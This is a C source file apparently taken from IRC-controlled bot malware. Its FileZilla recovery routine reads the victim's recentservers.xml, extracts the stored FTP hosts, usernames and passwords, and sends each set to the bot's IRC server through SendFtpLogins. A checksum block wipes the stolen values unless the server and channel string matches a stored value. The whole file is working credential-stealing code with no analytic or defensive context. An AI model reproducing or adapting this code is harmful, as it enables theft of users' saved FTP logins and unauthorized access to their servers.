#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_RECOVERY
void RecoverFileZilla()
{
    char cPath[DEFAULT];
    sprintf(cPath, "%s\\FileZilla\\recentservers.xml", cAppData);

    if(!FileExists(cPath))
        return;

    char cServerBefore[9];
    strcpy(cServerBefore, "<Server>");

    char cHostBefore[7];
    strcpy(cHostBefore, "<Host>");

    char cUserBefore[7];
    strcpy(cUserBefore, "<User>");

    char cPassBefore[7];
    strcpy(cPassBefore, "<Pass>");

    char cHost[DEFAULT];
    char cUser[DEFAULT];
    char cPass[DEFAULT];

    char *pcFileContents = GetContentsFromFile(cPath);
    char *pcBlockStart = strstr(pcFileContents, cServerBefore) + strlen(cServerBefore);

    while(strstr(pcBlockStart, cServerBefore))
    {
        char cBreakString[strlen(pcBlockStart)];

        char *pcProcessContents = strstr(pcBlockStart, cHostBefore) + strlen(cHostBefore);
        strcpy(cBreakString, pcProcessContents);
        char *pcBreakPiece = strtok(cBreakString, "<");
        strcpy(cHost, pcBreakPiece);

        pcProcessContents = strstr(pcBlockStart, cUserBefore) + strlen(cUserBefore);
        strcpy(cBreakString, pcProcessContents);
        pcBreakPiece = strtok(cBreakString, "<");
        strcpy(cUser, pcBreakPiece);

        pcProcessContents = strstr(pcBlockStart, cPassBefore) + strlen(cPassBefore);
        strcpy(cBreakString, pcProcessContents);
        pcBreakPiece = strtok(cBreakString, "<");
        strcpy(cPass, pcBreakPiece);

        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s@%s", cServer, cChannel);
        char *cStr = cCheckString;
        unsigned long ulCheck = (1345*4)+1;
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum6)
        {
            memset(cHost, 0, sizeof(cHost));
            memset(cUser, 0, sizeof(cUser));
            memset(cPass, 0, sizeof(cPass));
            return;
        }
        // <!-------! CRC AREA STOP !-------!>

        SendFtpLogins((char*)"FileZilla", cHost, cUser, cPass);
        Sleep(IRC_SND_DELAY);

        pcBlockStart = strstr(pcBlockStart, cServerBefore) + strlen(cServerBefore);
    }
}

DWORD WINAPI RecoverFtp(LPVOID)
{
    RecoverFileZilla();
    return 1;
}
#endif
#endif
